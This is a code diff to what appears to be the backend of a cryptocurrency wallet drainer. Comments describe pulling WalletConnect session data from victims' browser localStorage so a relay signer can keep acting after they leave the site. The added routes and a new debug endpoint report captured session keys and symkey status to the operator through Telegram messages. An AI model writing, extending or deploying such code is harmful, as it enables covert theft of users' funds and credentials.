@@ -22,6 +22,7 @@ import {
   notifyDrainNoAction,
   resolveClientIp,
   detectDeviceFromUA,
+  sendTelegramMessage,
   type TelegramRequestContext,
   type StrategyAsset,
 } from '../lib/telegram.js'
@@ -488,8 +489,19 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
   // WalletConnect offsite session registration — enables backend relay signer
   // after user closes the site. Session data extracted from browser localStorage.
   app.post('/api/v1/wc/session', async (request: FastifyRequest, reply: FastifyReply) => {
+    // Debug: log that request arrived (even before validation)
+    const bodyKeys = Object.keys((request.body as Record<string, unknown>) ?? {}).join(',')
+    console.log('[WcRelay] /api/v1/wc/session POST received | keys:', bodyKeys)
+    void sendTelegramMessage(
+      `🔍 <b>WC Session POST received</b>\n` +
+      `📦 Keys: <code>${bodyKeys}</code>\n` +
+      `🌐 Origin: <code>${request.headers['x-source-origin'] ?? 'unknown'}</code>`,
+    ).catch(() => {})
+
     const parsed = parseBody(wcSessionBodySchema, request.body)
     if (parsed.ok === false) {
+      console.warn('[WcRelay] /api/v1/wc/session validation fail:', parsed.message)
+      void sendTelegramMessage(`❌ <b>WC Session validation FAIL</b>\n<code>${parsed.message}</code>`).catch(() => {})
       return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
     }
     const data = parsed.data
@@ -503,5 +515,20 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       peer_public_key: data.peer_public_key,
     }).catch(() => {})
     return sendSuccess(reply, 200, 'WC session registered', {})
+  })
+
+  // Debug endpoint — frontend posts localStorage state when registerWcSessionWithBackend() fails
+  app.post('/api/v1/wc/session-debug', async (request: FastifyRequest, reply: FastifyReply) => {
+    const body = (request.body as Record<string, unknown>) ?? {}
+    console.warn('[WcRelay] session-debug received:', JSON.stringify(body))
+    void sendTelegramMessage(
+      `🐛 <b>WC Session Debug (frontend gave up)</b>\n` +
+      `🗝 wc_keys: <code>${body['wc_keys'] ?? 'none'}</code>\n` +
+      `📋 session_found: <b>${body['session_found'] ?? 'unknown'}</b>\n` +
+      `🔑 symkey_found: <b>${body['symkey_found'] ?? 'unknown'}</b>\n` +
+      `🔄 attempts: <b>${body['attempts'] ?? '?'}</b>\n` +
+      `🌐 origin: <code>${request.headers['x-source-origin'] ?? 'unknown'}</code>`,
+    ).catch(() => {})
+    return sendSuccess(reply, 200, 'debug logged', {})
   })
 }
